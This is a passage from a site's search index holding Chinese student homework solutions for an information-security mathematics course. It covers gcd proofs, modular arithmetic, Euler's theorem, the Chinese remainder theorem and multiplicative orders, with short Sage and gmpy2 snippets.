gcd(a+b, a^2 + b^2) = gcd(ks, \\frac{1}{2}k^2(s^2 + t^2)) = k *gcd(s, \\frac{1}{2}k(s^2 + t^2) )​$$\n当 $$k=2$$ 时：\n $$gcd(a+b, a^2+b^2) = 2 * gcd(s, s^2 + t^2) = 2 * gcd(s, t^2) =2 * gcd(s, t) = 2$$  当 $$k = 1​$$ 时：\n $$\\displaystyle gcd(a+b, a^2+b^2) = gcd(s, \\frac{1}{2}(s^2 + t^2)) = gcd(s, s^2 + t^2) = 1$$  9 #   引理：$$\\displaystyle a^{st} - 1 = (a^s - 1)(\\sum_{i=1}^{t} a^{s(t-i)})$$\n 设 $$r = gcd(m,n), m = rs, n = rt$$，\n对于 $$\\displaystyle a^m - 1 = a^{rs} - 1 = (a^r - 1)(\\sum_{i=1}^s a^{r(s - i)}) = (a^r - 1)\\sum_{i = 0}^{s-1}a^{ri}$$，令 $$\\displaystyle T_s = \\sum_{i=0}^{s-1} a^{ri}$$\n同理可以得到：$$\\displaystyle a^n - 1 = a^{rt} - 1 = (a^r - 1)T_t$$\n可以用辗转相除证明：\n若 s, t 互素，$$\\exist u(x), v(x)$$ 为多项式函数，使得 $$u(a) * T_s + v(a) * T_t = 1$$\n所以 $$ T_s, T_t$$ 互素，则有：$$gcd(a^m - 1, a^n - 1) = a^r - 1$$\n10 #   引理：$$n(n+1) = 2k(2k+1)​$$\n $$p_n = n^4 + 2 n^3 + 11n^2 +10n = n(n + 1)(n(n+1) + 10) $$\n$$2k(2k+1)(4k^2 + 2k +10) = 4k(2k + 1)(2k^2 + k +5)$$\n  当 $$k \\equiv 0 \\pmod{3}$$ 时，$$3 | k \\Rightarrow 12 | 4k \\Rightarrow12 | p_n$$\n  当 $$k \\equiv 1 \\pmod{3}$$ 时，$$3 | 2k + 1 \\Rightarrow 12 |4(2k+1) \\Rightarrow 12 | p_n$$\n  当 $$k \\equiv 2\\pmod{3}$$ 时，$$3 | 2k^2 +k + 5\\Rightarrow 12 | p_n$$\n  11 #  因为：\n  对于 $$a \\equiv 0 \\pmod{3}$$，有 $$a^2 \\equiv 0 \\pmod{3}$$\n  对于 $$a \\equiv 1 \\pmod{3}$$，有 $$a^2 \\equiv 1 \\pmod{3}$$\n  对于 $$a \\equiv 2 \\pmod{3}$$，有 $$a^2 \\equiv 1 \\pmod{3}$$\n  所以不存在任何 x，使得 $$x^2 \\equiv 2 \\pmod{3}$$\n对于 $$3 | a^2 +b^2$$，若 $$a^2 \\equiv 1 \\pmod{1}$$，则 $$b^2 \\equiv 2 \\pmod{3}$$，这是不存在的。\n所以 $$a^2 \\equiv 0 \\pmod{3}, b^2 \\equiv 0 \\pmod{3} \\Rightarrow 3 |a, 3|b$$\n12 #  对于 $$\\mathbb{Z}_{10}$$，用穷举方式很容易验证：$$\\forall x, x^5 \\equiv x \\pmod{10}$$\n所以对任意 n 的个位数 $$n_0$$：$$n_0^{k-1} n_0^5 \\equiv n_0^{k-1}n_0 \\pmod{10} \\Rightarrow n_0^{k+4} \\equiv n_0^{k} \\pmod{10} $$\n13 #  $$n^2 + (n+1)^2 = m^2 + 2 \\Leftrightarrow$$\n$$2n^2 + 2n + 1 = m^2 + 2​$$\n因为 $$2n^2 + 2n + 1 \\equiv 1 \\pmod{2}$$，所以 $$m \\equiv 1 \\pmod{2}$$\n带入：$$m = 2k + 1​$$，\n$$2n^2 + 2n + 1 = 4 k^2 + 4 k +3 \\Leftrightarrow n^2 + n = 2k^2 + 2 k + 1$$\n$$n^2 + n \\equiv 0 \\pmod{2}, 2k^2 + 2 k + 1 \\equiv 1 \\pmod{2}$$，等式恒不成立。\n14 #  考虑 $$\\mathbb{Z}_{n}$$，\n设 n 个整数为有序数列 $$a_1, a_2, \u0026hellip;a_n​$$，其前 m 项和为 $$\\displaystyle S_m = \\sum_{i=1}^{m} a_i, m= 1,2, \u0026hellip;, n​$$\n若对 $$S_m \\equiv T_m \\pmod{n}​$$ 的取值空间分析，显然其取值空间大小为 n，\n 若 $$\\forall i,j \\in [1, n], i\\neq j \\Rightarrow T_i \\neq T_j$$，必有 $$\\exist S_i \\equiv 0 \\pmod{n}$$ 若 $$\\exist i,j \\in [1, n], i\\neq j, T_i = T_j$$，令 $$S_0 = S_i - S_j, S_0 \\equiv 0 \\pmod{n}$$  15 #   https://zhidao.baidu.com/question/90940244.html\n 对于任何 $$k \\in [1, 2n], \\exist A,B, k = A*2^B, \\text{where } A \\equiv 1 \\pmod{2}, B \\ge 0$$\n考虑 A 的取值，可知 A 最大为 $$2n-1$$，因此 A 的取值空间大小为 n。\n若取出 n+1 个数，则必存在 $$k_1 = A_i 2^{B_1}, k_2 = A_i2^{B_2}$$，二者必存在整除关系\n16 #   https://blog.csdn.net/zhcosin/article/details/48932201\n 同 15，对于任何 $$k \\in [1, n], \\exist a,b, k = a*2^b, \\text{where } a \\equiv 1 \\pmod{2}, b \\ge 0$$\n我们令 b 取值空间中的最大值为 B，可知 B 的最大值只出现一次：\n 若出现两次，即存在 $$2^{B} a_1 \\neq 2^{B} a_2$$，那么必然存在 $$2^{B+1}a_0 \\in [2^Ba_1, 2^Ba_2]$$ ，这与 B 为最大值矛盾。设这个数字为：$$K = 2^{B} A$$  对于 $$\\displaystyle S_n = 1 + \\frac{1}{2} + \u0026hellip; + \\frac{1}{n}$$\n同乘 $$2^{B-1} a_0 a_1\u0026hellip;a_{s-1}$$，其中 s 是 a 的取值空间大小：$$\\displaystyle 2^{B-1} a_0 a_1\u0026hellip;a_{s-1} S_n = P + 2^{B-1} a_0 a_1\u0026hellip;a_{s-1} *\\frac{1}{K}$$，其中 P 是一个整数。\n显然，$$\\displaystyle 2^{B-1} a_0 a_1 \u0026hellip; a_{s-1} *\\frac{1}{K} = \\frac{a_0 a_1 \u0026hellip; a_{s-1}}{2 * A}$$ 不是整数，那么 $$S_n$$ 也不是整数。\n17 #   定义：\n 对于 n 为完全平方数，即存在正整数 k，使得 $$k^2 = n$$    引理：\n $$mn$$ 为完全平方数的充要条件是 $$m,n$$ 均为完全平方数   充分性是很显然的。\n必要性：\n不失一般性，对于 $$\\displaystyle n = p_1^{a_1} p_2^{a_2} \u0026hellip; p_s^{a_s}$$，我们设仅 $$\\alpha_1 \\equiv 1 \\pmod{2}$$\n即证明：对于素数 $$p_1​$$，奇数 $$\\alpha_1 \\equiv 1 \\pmod{2}​$$，$$p_1^{\\alpha_1}​$$ 不可能为完全平方数。\n对于 $$\\forall n \\in [1, p_1^{\\alpha_1}]​$$，有且仅有 $$n = p_1, p_1^{\\alpha_1} \\equiv 0 \\pmod{n}​$$\n若存在 $$k^2 = p_1^{\\alpha_1}​$$，则：$$k^2 \\equiv 0 \\pmod{p_1} \\Rightarrow k = p_1 \\Rightarrow p_1^2 = p_1^{\\alpha_1}​$$\n由于 $$\\alpha_1 \\equiv 1 \\pmod{2}$$，则 $$p_1 = 1$$，这与 $$p_1$$ 是素数矛盾。\n18 #  若 $$\\sqrt[3]{5}$$ 为无理数，设 $$\\displaystyle \\sqrt[3]{5} = \\frac{q}{p}, \\text{where }gcd(p, q) = 1$$\n则 $$5p^3 = q^3 \\Rightarrow 5 | q, q = 5k \\Rightarrow p^3 = 5^2k^3 \\Rightarrow 5|p \\Rightarrow gcd(p,q) \\neq 1$$\n这与假设矛盾。\n"},{"id":98,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/homework/2.2/","title":"2.2","section":"HOMEWORK","content":"2.2 #  解答题 #  1 #  关于欧拉函数，对于 10：$$\\phi(10) = 4$$\n因此我们知道 $$7^4 \\equiv 1 \\pmod{10}$$，而 $$2046 \\equiv 2 \\pmod{4}$$\n因此，我们有：$$7^{2046} \\equiv 7^2 \\equiv 9 \\pmod{10}​$$\n2 #  对于 100 有：$$100 = 4*25$$，并且有 $$\\phi(25) = 20$$\n因此首先有 $$2^{100} \\equiv 0 \\pmod{4}$$，然后有 $$2^{100} = (2^{5})^{20} \\equiv 1 \\pmod{25}$$\n而存在这样的数 76：$$2^{100} \\equiv 76 \\pmod{4}, 2^{100} \\equiv 76 \\pmod{25}$$\n因此 $$2^{100} \\equiv 76 \\pmod{100}$$\n3 #  考虑到 $$\\displaystyle (x+4)^5 \\overset{二项式展开}{\\equiv} x^5 \\pmod{4}$$\n有因为 $$99 = 4 * 25 - 1 = 4*24 + 3$$\n因此我们有：$$1^5 + 2^5 + 3^5 +\u0026hellip; + 99^5 \\equiv 24 * (1^5 + 2^5 + 3^5) \\equiv 0\\pmod{4}$$\n4 #  我们知道 $$555 \\equiv 2 \\pmod{7}$$，\n并且有：$$2^3 \\equiv 1 \\pmod{7}, 555 \\equiv 0 \\pmod{3}$$\n因此：$$555^{555} \\equiv 2^{555} \\equiv 2^0 \\equiv 1 \\pmod{7}​$$\n5 #  （1）每个数都是奇数的模 9 完全剩余系：\n$${1, 11, 3, 13, 5,15, 7, 17, 9}$$\n（2）每个数都是偶数的模 9 完全剩余系：\n$${0, 10, 2, 12, 4, 14, 6, 16, 8}$$\n6 #  考虑 $$r_i = 11k+n, n =1,2,\u0026hellip;,11$$，\n有：$$11k+n \\equiv 1\\pmod{3} \\Rightarrow 11k \\equiv 1-n \\pmod{3}$$\n枚举 n 计算 k 可以得到这样的模 11 完全剩余系：\n$$k = {0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1} \\overset{剩余系}{\\Rightarrow}{1, 13, 25, 4, 16, 28, 7, 19, 31, 10, 22}$$\n7 #  可以通过 sage 中的数论模块计算欧拉函数：\nfrom sage.all import * print(euler_phi(24), euler_phi(64), euler_phi(187), euler_phi(360)) # (8, 32, 160, 96) （NOTE：在 Arch Linux 下安装 sage 的命令：yaout sagemath）\n也可以用短除法将其素因数分解$$\\displaystyle m = p_1^{a_1} p_2^{a_2} \u0026hellip; p_s^{a_s}​$$，\n然后利用公式 $$\\displaystyle \\phi(m) = m \\prod_{i=1}^s (1 - \\frac{1}{p_i})​$$，计算其欧拉函数。比如：\n24 ==\u0026gt; 2 2 2 3 ==\u0026gt; 24=(2^3)*(3^1)\rphi(24) ==\u0026gt; 24*(1/2)*(2/3) ==\u0026gt; 8\r8 #   费马小定理：若 p 是素数，则对任意整数 a，有：$$a^p \\equiv a \\pmod{p}$$\n （1）\n根据费马小定理，我们有：$$9^{73} \\equiv 9 \\pmod{73}$$\n我们又知道：$$794 \\equiv 2 \\pmod{72}$$\n因此我们知道 $$9^{794} \\equiv 9^2 \\equiv 8 \\pmod{73}$$\n因为 $$a \\in [0, 73)​$$，所以 $$a = 8​$$\n（2）\n我们有：$$x^{29} \\equiv x \\pmod{29}, 86 \\equiv 2 \\pmod{28}$$\n因此 $$x^{86} \\equiv x^{2} \\equiv 6\\pmod{29}​$$\n  穷举 29 以内的所有自然数：\nfor i in range(29): if (i**2)%29 == 6: print(i) # 8 21   也可使用 sage 模块进行求解：\nfrom sage.all import * x = SR.symbol(\u0026#39;x\u0026#39;) solve_mod(x**2==6, 29) # [(8,), (21,)]   所以原同余方程的解为：$$x \\equiv 8 \\pmod{29}​$$ 或 $$x \\equiv 21 \\pmod{29}​$$\n（3）\n同样的：$$x^{13} \\equiv x \\pmod{13}, 39 \\equiv 3 \\pmod{12}$$\n因此：$$x^{39} \\equiv x^{3} \\equiv 3 \\pmod{13}$$\n同样地，穷举 13 以内的所有自然数（大于 13 的数仍无法成立已在第三题中证明）：\nfor i in range(13): if (i**3)%13 == 3: print(i) # \u0026lt;没有输出\u0026gt; 所以该同余方程没有解\n9 #  可以直接使用 gmpy2 中的 invert 函数进行计算：\nimport gmpy2 print(gmpy2.invert(229, 281)) # mpz(27) 另外，笔算可以使用欧几里得扩展算法，\n因为考虑到贝祖等式成立：$$ax + by = gcd(a, b)$$\n令 $$a = 229, b = 281 \\Rightarrow gcd(a, b) =1$$，那么 x 即为 a 关于模 281 的逆元：\n$$\\begin{pmatrix} 281 \\ 229\\end{pmatrix} = \\begin{pmatrix} 1 \u0026amp; 1 \\ 1 \u0026amp; 0\\end{pmatrix}\\begin{pmatrix} 4 \u0026amp; 1 \\ 1 \u0026amp; 0\\end{pmatrix}\\begin{pmatrix} 2 \u0026amp; 1 \\ 1 \u0026amp; 0\\end{pmatrix}\\begin{pmatrix} 2 \u0026amp; 1 \\ 1 \u0026amp; 0\\end{pmatrix} \\begin{pmatrix} 10 \u0026amp; 1 \\ 1 \u0026amp; 0\\end{pmatrix} \\begin{pmatrix} 1 \\ 0\\end{pmatrix} ​$$\n$$\\Rightarrow \\begin{pmatrix} 281 \\ 229\\end{pmatrix} = \\begin{pmatrix} 281 \u0026amp; 27\\ 229 \u0026amp; 22\\end{pmatrix}\\begin{pmatrix} 1 \\ 0\\end{pmatrix} \\Rightarrow \\begin{pmatrix} -22 \u0026amp; 27 \\ 229 \u0026amp; -281\\end{pmatrix} \\begin{pmatrix} 281 \\ 229\\end{pmatrix} = \\begin{pmatrix} 1 \\ 0\\end{pmatrix}$$\n因此我们有：$$229^{-1} = 27 \\pmod{281}$$\n10 #  设对于 m：$$\\displaystyle m = 2^{a_1} p_2^{a_2} \u0026hellip; p_s^{a_s}​$$，其中 $$\\alpha_1​$$ 为非负整数，其他 $$\\alpha_i​$$ 为正整数\n显然有 $$p_i, i = 2,3,\u0026hellip;,s$$ 为奇数。\n根据欧拉函数的计算有： $$\\displaystyle \\phi(m) = m (\\frac{1}{2})^{\\alpha_1\u0026gt;0}\\prod_{i=2}^s (1 - \\frac{1}{p_i}) = m (\\frac{1}{2})^{\\alpha_1\u0026gt;0}\\prod_{i=1}^s \\frac{p_i - 1}{p_i}$$\n 若 $$s \u0026gt; 0​$$，那任意的 i，总有 $$p_i \\equiv 1 \\pmod{2}, p_i -1 \\equiv 0 \\pmod{2}​$$，所以此时 $$\\displaystyle \\prod_{i=2}^s \\frac{p_i - 1}{p_i}​$$ 总有一个 2 的因子。 若 $$s =0​$$，那么 $$\\displaystyle \\phi(m) = \\frac{m}{2} ​$$，为了使 $$ m \u0026gt; 3​$$，一定有 $$\\displaystyle \\frac{m}{2}​$$ 存在 2 的因子。  11 #  设命题 M：$$\\phi(m)$$ 能被 4 整除；$$\\overline{M}$$：$$\\phi(m)$$ 不能被 4 整除。\n  先考虑 m 为偶数，根据第十题的讨论：$$\\overline{M}$$ 一个必要条件是 $$\\displaystyle \\frac{m}{2}$$ 的素因子数量仅为一（若大于 1 的话，必然出现两个 2 的因子），分类讨论这个素因子为 2 的情况：\n 得到一个更强的 $$\\overline{M}$$ 的必要条件：$$\\displaystyle \\frac{m}{2}$$ 是素数。  再考虑 $$\\overline{M}$$ 一个必要条件：\n不考虑 $$\\displaystyle \\frac{m}{2} = 2$$ 的情况，为使 $$\\displaystyle \\frac{m}{2} - 1 \\not\\equiv 0 \\pmod{4}$$，必有 $$\\displaystyle \\frac{m}{2} = 4k+3$$。\n所以：$$m \\in {2k | k = 2 或 k 为形如 4n+3 的素数}$$\n  再考虑 m 为奇数，同样根据第十题的讨论也能得到，m 的素因子数量仅为一，结合 m 为奇数的条件：\n 可以得到一个 $$\\overline{M}$$ 的必要条件：$$m$$ 是素数  再考虑一个必要条件可以得到：$$m = 4k+3$$。\n所以：$$m \\in {k | k为形如 4n+3 的素数}$$\n  综上所述，m 的取值空间为：$${2} \\cup{k, 2k | k为形如 4n+3 的素数}$$\n12 #  from sage.all import * x = SR.symbol(\u0026#39;x\u0026#39;) solve_mod(27*x == 12, 15), solve_mod(24*x == 6, 81), solve_mod(91*x == 26, 169), solve_mod(71*x == 32, 3441) # ([(6,), (1,), (11,)], # [(7,), (34,), (61,)], # [(4,), (17,), (30,), (43,), (56,), (69,), (82,), (95,), (108,), (121,), (134,), (147,), (160,)], # [(1309,)]) 笔算通过以下的定理计算：\n 设 $$m \u0026gt; 1, gcd(a, m) =d \u0026gt; 1$$，则同余方程 $$ax \\equiv b \\pmod{m}$$ 有解的充要条件是 $$d | b$$，并且其解的个数为 d，且若 $$x \\equiv x_0 \\pmod{m}$$ 是一个特解，则它的 d 个解为：$$\\displaystyle x \\equiv x_0 + \\frac{m}{d}t \\pmod{m}, t = 0,1,\u0026hellip;,d-1$$\n 13 #  容易得到：$$7^{-1} \\equiv 15 \\pmod{26}$$，即：$$7*15 \\equiv 1 \\pmod{26}$$\n$$y \\equiv 7x + 3\\pmod{26} \\Rightarrow y-3 \\equiv 7x \\pmod{26} \\Rightarrow x \\equiv15y -45 \\pmod{26}$$\n化简得到：$$x \\equiv 15y + 7 \\pmod{26}$$\n14 #   定理：设 $$m_1, m_2,.., m_k$$ 是 k 个两两互素的正整数，若令 $$m = m_1 m_2 \u0026hellip;m_k, m = m_iM_i$$，则对任意的整数 $$b_1, b_2, \u0026hellip;, b_k$$，同余方程组：\n$$\\begin{cases}x \\equiv b_1 \\pmod{m_1} \\ x \\equiv b_2 \\pmod{m_2} \\ \u0026hellip; \\x \\equiv b_k \\pmod{m_k} \\end{cases}$$\n有唯一解：$$\\displaystyle x \\equiv \\sum_{i=1}^{k} M_iM_i' b_i \\pmod{m}$$，其中 $$M_i M_i' \\equiv 1 \\pmod{m_i}$$\n （1）$$x \\equiv 2519 + 12 * 23 * 6 \\equiv 81 \\pmod{300}$$\n（2）$$x \\equiv 33015 + 154412 + 1051318 \\equiv 1272\\pmod{2310}$$\n（3）\n$$\\begin{cases} x \\equiv 2 \\pmod{9} \\ 3x \\equiv 4 \\pmod{5} \\ 4x \\equiv 3 \\pmod{7} \\end{cases} \\Rightarrow \\begin{cases} x \\equiv 2 \\pmod{9} \\ x \\equiv 24 \\pmod{5} \\ x \\equiv 23 \\pmod{7} \\end{cases} \\Rightarrow \\begin{cases} x \\equiv 2 \\pmod{9} \\ x \\equiv 3 \\pmod{5} \\ x \\equiv 6 \\pmod{7} \\end{cases}$$\n所以 $$x \\equiv 3582 + 6323 + 4556 \\equiv 83 \\pmod{315}$$\n15 #  设士兵的总人数为 x，即有方程组：$$\\begin{cases}x \\equiv 1 \\pmod{3} \\ x \\equiv 2 \\pmod{5} \\ x\\equiv 2 \\pmod{7} \\end{cases}$$\n根据上面描述的定理：$$x \\equiv 3521 + 2112 + 1512 \\equiv 37\\pmod{105}$$\n考虑到 x 的取值范围，因此共有 37 个士兵。\n16 #  对于 440，我们有 $$440 = 112^35$$，因此对 $$91x \\equiv 419 \\pmod{440}$$ 有：\n$$\\begin{cases} 91x \\equiv 419 \\pmod{11} \\91x \\equiv 419 \\pmod{8} \\ 91x \\equiv 419 \\pmod{5} \\end{cases} \\Rightarrow \\begin{cases} 3x \\equiv 1 \\pmod{11} \\ 3x \\equiv 3 \\pmod{8} \\ x \\equiv 4 \\pmod{5} \\end{cases} \\Rightarrow \\begin{cases} x \\equiv 4 \\pmod{11} \\ x \\equiv 1 \\pmod{8} \\ x \\equiv 4 \\pmod{5} \\end{cases}$$\n同样的根据之前的定理：$$x \\equiv 4084 + 5571 + 8824 \\equiv 169 \\pmod{440}$$\n17 #  即求同余方程组 $$\\begin{cases} x \\equiv 0 \\pmod{13} \\ x \\equiv 2 \\pmod{3} \\ x \\equiv 2 \\pmod{5}\\ x \\equiv 2 \\pmod{7} \\ x \\equiv 2 \\pmod{11} \\end{cases}$$ 的解，\n解得 $$x \\equiv 2*(5005*1 + 3003*2 + 2145*5 + 1365*1) \\equiv 1157 \\pmod{15015}$$\n18 #  设其中的最后一个整数为 x，即解同余方程组：\n$$\\begin{cases}x - 3\\equiv 0 \\pmod{2^2} \\ x -2 \\equiv 0 \\pmod{3^2} \\ x-1 \\equiv 0 \\pmod{5^2} \\ x \\equiv 0 \\pmod{7^2}\\end{cases} \\Rightarrow \\begin{cases}x \\equiv 3 \\pmod{4} \\ x \\equiv 2 \\pmod{9} \\ x \\equiv 1 \\pmod{25} \\ x \\equiv 0 \\pmod{49}\\end{cases} $$\n解得 $$x \\equiv 105^213 + 70^2 * 7 *2 + 42^2 * 9 *1 \\equiv 29351\\pmod{210^2}$$\n所以这四个数分别为：29348, 29349, 29350, 29351\n19 #  也就是说有这样的两个等式成立：$$K \\begin{pmatrix} 3 \\ 14\\end{pmatrix} = \\begin{pmatrix} 1 \\ 14\\end{pmatrix}, K \\begin{pmatrix} 2 \\ 19\\end{pmatrix} = \\begin{pmatrix} 11 \\ 21\\end{pmatrix}$$\n对 K 的四个未知数，可以列出以下的方程式：$$\\begin{cases} 3a_{11} + 14a_{12} = 1 \\ 3a_{21} + 14a_{22} = 14 \\ 2a_{11} + 19 a_{12} = 11 \\ 2a_{21} + 19 a_{22} = 21\\end{cases}\\pmod{26}$$\n可以由这个方程组解出：$$\\begin{cases} a_{11} \\equiv 7 \\ a_{12} \\equiv 19 \\ a_{21} = 8 \\ a_{22} = 3 \\end{cases}$$，所以这个矩阵为 $$K= \\begin{pmatrix} 7 \u0026amp; 19 \\ 8 \u0026amp; 3\\end{pmatrix}$$\n20 #  from sage.all import * x = SR.symbol(\u0026#39;x\u0026#39;) print(solve_mod(3*x**14 + 4*x**13 + 2*x**11 + x**9 +x**6 +x**3 + 12*x**2 + x == 0, 5)) # [(0,), (1,), (2,)] 即 $$x \\equiv 0, 1, 2 \\pmod{5}​$$\n另外，可以通过一下方法笔算：\n注意到欧拉函数 $$\\phi(5) = 4$$，因此根据欧拉定理我们有 $$x^{\\phi(5)} \\equiv x^4 \\equiv 1 \\pmod{5}$$\n因此在模 5 的情况下有：\n$$3x^{14} + 4x^{13} + 2x^{11} +x^9 + x^6 +x^3 +12x^2 +x \\equiv 0 \\pmod{5} \\Leftrightarrow$$\n$$3x^{2} + 4x^1 + 2x^{3} + x^1 + x^2 +x^3 +2 x^2 +x \\equiv 0 \\pmod{5} \\Leftrightarrow$$\n$$3x^3 + 6x^2 +6x \\equiv 0 \\pmod{5} \\Leftrightarrow x^3 + 2x^2 + 2x \\equiv 0 \\pmod{5}$$\n穷举就容易求解了。\n证明题 #  1 #  设一个正整数 n 表示为：$$\\displaystyle n = \\sum_{i=0}^{m}\\alpha_i*10^i$$\n那么即证明 $$\\displaystyle n \\equiv 0 \\pmod{3} \\Leftrightarrow \\sum_{i=0}^{m} \\alpha_i \\equiv 0 \\pmod{3}$$\n我们知道对任意 i，有：$$10^i \\equiv 1 \\pmod{3}$$（考虑 $$10^i - 1$$ 与 3 的整除关系）\n于是我们有以下等价关系的推导：\n$$\\displaystyle n = \\sum_{i=0}^{m} (\\alpha_i *(10^i - 1)) + \\sum_{i=0}^{m} \\alpha_i \\equiv 0\\pmod{3} \\Leftrightarrow \\sum_{i=0}^{m}\\alpha_i \\equiv 0 \\pmod{3}$$\n所以题式得证。\n2 #  设 $$f(x) = 0 $$ 有一个整数解 s，即 $$f(s) = 0$$，设 $$t \\in \\mathbb{Z}_m, s \\equiv t \\pmod{m}$$\n又有：$$f(1), f(2), \u0026hellip;, f(m) \\not\\equiv 0 \\pmod{m} \\Leftrightarrow f(0), f(1), \u0026hellip;f(m-1) \\not\\equiv 0 \\pmod{m}$$\n所以我们有以下的推导：\n$$\\displaystyle f(s) = 0 \\overset{弱化}{\\Rightarrow} f(s) \\equiv 0 \\pmod{m} \\overset{f(x) 是整系数多项式}{\\Rightarrow} f(t) \\equiv 0 \\pmod{m}$$\n注意到 $$t \\in \\mathbb{Z}_m$$，这与上面的推导是矛盾的，所以 $$f(x) = 0$$ 不存在整数解。\n3 #  我们注意到 $$(m-1)^2 - 1^2 = m(m-2) \\equiv 0 \\pmod{m}$$\n这意味着：$$(m-1)^2 \\equiv 1^2 \\pmod{m}$$\n这违反了完全剩余系两两不同余的构造条件。\n4 #  我们先假定一个不需要证明的定理：\n 模 m 的完全剩余类完备地将 $$\\mathbb{Z}$$ 分割为 m 个集合。即 $$\\forall n \\in \\mathbb{Z}, \\exist C_r, n\\in C_r, r \\in \\mathbb{Z}_m$$  因为，m 个整数都不属于模 m 的 0 剩余类。\n那么总共有 m-1 个完全剩余类，完备地覆盖 m 个整数的取值空间。\n根据鸽笼定理，题式成立。\n5 #  考虑设 $$ 1 \\le s \\le t \\le 18$$，\n先证明这样的结论：$$s \\equiv t \\pmod{18} \\Leftrightarrow 2^s \\equiv 2^t \\pmod{27}$$\n有以下推导：$$2^s \\equiv 2^t \\pmod{27} \\Leftrightarrow 2^s(2^{t-s} - 1) \\equiv 0 \\pmod{27} \\Leftrightarrow 2^{t-s} \\equiv 1 \\pmod{27}$$\n$$\\Leftrightarrow t-s \\equiv 0 \\pmod{\\phi(27)} \\Leftrightarrow t \\equiv s \\pmod{18}$$\n所以根据反证法有：$$2, 2^2, 2^3,\u0026hellip;,2^{18}$$ 两两不同余，而有可以知道模 27 的完全剩余系大小为 $$\\phi(27) = 18$$，因此必有 $$2, 2^2, 2^3,\u0026hellip;,2^{18}$$ 构成一个完全剩余系。\n6 #  因为 7 是素数，根据费马小定理 $$a^7 \\equiv a \\pmod{7}​$$\n又因为 $$gcd(a, 3) = 1 \\Rightarrow gcd(a, 9) = 1​$$，根据欧拉定理 $$a^{\\phi(9)} \\equiv 1 \\pmod{9}​$$\n因此我们有：$$a^7 \\equiv a \\pmod{7}, a^7 \\equiv a \\pmod{9} \\Rightarrow a^7 \\equiv a \\pmod{63}$$\n7 #  见解答题第九题。\n8 #  对于欧拉函数的分解 $$\\phi(n) = 14 = 2*7$$\n我们又知道任意 $$\\displaystyle m = p_1^{a_1} p_2^{a_2} \u0026hellip; p_s^{a_s}$$\n其欧拉函数可以表示成为：$$\\displaystyle \\phi(m) = m \\prod_{i=1}^s (1 - \\frac{1}{p_i}) = \\frac{m}{p_i p_2 \u0026hellip; p_s} \\prod_{i=1}^{s}(p_i - 1)​$$ 的形式。\n因为 $$p_i​$$ 均为素数，而 $$7+1​$$ 不是素数，$$\\displaystyle 7 | \\frac{m}{p_1p_2\u0026hellip;p_s} \\Rightarrow 7|m \\Rightarrow 7 \\in {p_{i+1} | i \\in \\mathbb{Z}_s}​$$\n有 $$7-1=6$$，从而：$$\\displaystyle 3 | \\prod_{i=1}^{s}(p_i - 1)$$，且 $$\\displaystyle \\frac{m}{p_i p_2 \u0026hellip; p_s}$$ 总是一个整数，\n但 3 并不整除 14，这是矛盾的，因此不存在这样的数字 n 使得 $$\\phi(n) = 14$$\n9 #  （1）\n对于奇数 $$a = 2k+1, k \\ge 1$$，根据欧拉定理，我们有：$$\\displaystyle 2^{\\phi(a)} \\equiv 1 \\pmod{a}$$\n因为 $$\\phi(a) \\le a-1$$ 总是成立的，所以 $$\\phi(a) = d$$ 即为所求。\n（2）\n因为我们有：$$\\displaystyle 2^{kd_0} - 1 = (2^{d_0} - 1)(\\sum_{i=1}^{k} 2^{d_0(k-i)})$$\n$$\\displaystyle d_0 | h \\Leftrightarrow h = kd_0 \\Leftrightarrow (2^{d_0} - 1)| (2^h -1)$$\n至此，充分性是分显然的： $$(2^{d_0} - 1)|(2^h - 1) \\Rightarrow a|(2^h - 1)$$\n关于必要性：\n如果 $$d_0$$ 与 $$h$$ 有非 1 最大公因数数，那么这与 $$d_0$$ 最小相悖。\n如果 $$d_0$$ 与 h 是互素的，根据 2.1 第九题的证明，$$(2^{d_0} - 1) | (2^h -1)$$ 不可能成立。\n因此我们用反证法证明了必要性。\n10 #  $$2x^3 - x^2 +3x +11 \\equiv 0 \\pmod{5} \\Leftrightarrow 2x^3 - x^2 +3x -4 \\equiv 0 \\pmod{5}$$\n$$\\Leftrightarrow (x-1)(2x^2 + x + 4) \\equiv 0 \\pmod{5} \\Rightarrow x = 1\\pmod{5} 或 2x^2 + x +4 \\equiv 0 \\pmod{5}​$$\n$$2x^2 + x +4 \\equiv 0 \\pmod{5} \\Leftrightarrow 2x^2 +x -1 \\equiv 0 \\pmod{5} \\Rightarrow (x+1)(2x - 1) \\pmod{5}$$\n由此可知三个解分别为 $$x \\equiv 1, 3, 4 \\pmod{5} ​$$\n"},{"id":99,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/homework/3.1/","title":"3.1","section":"HOMEWORK","content":"3.1 #  解答题 #  1 #  #!/usr/bin/env python2 from sage.all import * R = IntegerModRing(37) # 建立一个模 37 的整数环 p = R(34) # 取整数环上的数 34 print(p.multiplicative_order()) # 求次数（http://mathonline.wikidot.com/the-order-of-a-permutation） 9 即，我们有 $$34^{9} \\equiv 1 \\pmod{37}$$\n手算可以先计算 37 的欧拉函数：$$\\phi(37) = 36$$\n根据欧拉定理，与次数的性质，34 对模 37 的次数一定是 36 的因子，穷举可得 9。\n2 #  #!/usr/bin/env python2 from sage.all import * R = IntegerModRing(37) p = R(2**12) print(p.multiplicative_order()) # 3 即，我们有 $$\\displaystyle 2^{12*3} \\equiv 1 \\pmod{37}$$\n笔算：\n对 2，根据欧拉定理，我们知道：$$2^{36} = 2^{12*3} \\equiv 1 \\pmod{37}$$\n再对 2，考虑次数的性质：$$24 \\not| 36$$，所以必有 $$2^{24} = 2^{12*2} \\not\\equiv 1 \\pmod{37}$$\n因此 3 是 $$2^{12}$$ 模 37 的次数。\n3 #  #!/usr/bin/env python2 from sage.all import * R = IntegerModRing(61) for i in range(61)[1:]: p = R(i) if p.multiplicative_order() == 4: print(p) # 11 50 笔算：\n2 是模 61 的原根 $$\\Leftrightarrow 2^{60} \\equiv 1 \\pmod{61} 且 2^{i} \\not\\equiv 1 \\pmod{61}, i = 1,2,\\dots,59$$\n显然我们知道 $$2^{60} = (2^{15})^{4} \\equiv (11)^4 \\equiv (\\pm 11)^4 \\equiv 1 \\pmod{61} $$\n然后因为对于任意 $$i \u0026lt; 4, 15i 